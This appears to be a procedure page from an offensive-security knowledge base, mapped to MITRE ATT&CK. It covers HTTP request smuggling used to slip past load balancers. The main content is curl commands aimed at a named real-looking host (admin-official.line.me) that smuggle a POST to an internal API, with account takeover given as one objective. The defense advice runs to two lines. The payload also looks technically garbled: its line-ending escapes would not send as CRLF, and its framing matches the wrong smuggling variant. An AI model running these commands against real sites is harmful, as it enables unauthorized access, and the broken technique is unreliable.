---
tags:
  - http-request-smuggling
  - exploitation
type: procedure
tools:
  - '[[tools/curl]]'
  - '[[tools/netcat]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-http-smuggling-test]]'
  - '[[commands/netcat-listen]]'
platforms:
  - Web
techniques:
  - '[[Command-Line Interface]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: f7677736-410e-4677-b1e8-2a0cf9e78f52
created_at: '2025-12-11T06:10:28.378Z'
updated_at: '2025-12-11T06:10:28.378Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1059]]'
---
# Craft Smuggled HTTP Request

## Summary

This procedure crafts a malicious HTTP request exploiting TE.CL smuggling to bypass load balancers and inject unauthorized requests to backend services.

## Description

By constructing requests with chunked encoding and mismatched content lengths, attackers can smuggle payloads that are processed by backends but ignored by frontends, enabling attacks on sites like admin-official.line.me.

## Requirements

1. Confirmed smuggling vulnerability
2. HTTP client capable of custom headers
3. Target endpoint details

## Defense

- Use consistent HTTP parsers across stack
- Reject requests with conflicting headers

## Objectives

1. Bypass load balancer protections
2. Deliver smuggled payload to backend
3. Prepare for impact like account takeover

## Instructions

### Step 1: Construct Payload

**Context**: Build the smuggled request structure.

**Command** ([[commands/curl-http-smuggling-test]]):
```bash
curl -k -H "Host: admin-official.line.me" -H "Transfer-Encoding: chunked" -H "Content-Length: 4" --data "0\r\n\r\nPOST /internal/api HTTP/1.1\r\nHost: internal.backend\r\nContent-Length: 10\r\n\r\nmalicious=1\r\n" https://admin-official.line.me
```

> This smuggles a POST request to an internal API.

### Step 2: Test Delivery

**Context**: Verify if the backend processes the smuggled part.

**Command** ([[commands/curl-http-smuggling-test]]):
```bash
curl -v -H "Transfer-Encoding: chunked" https://admin-official.line.me
```

> Check for backend-specific responses.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Command-Line Interface]]

### Sub-Techniques

## Commands Used

- [[commands/curl-http-smuggling-test]]

## Tools Used

- [[tools/curl]]

## Tags

- [[commands/curl-http-smuggling-test]]
- [[exploitation]]
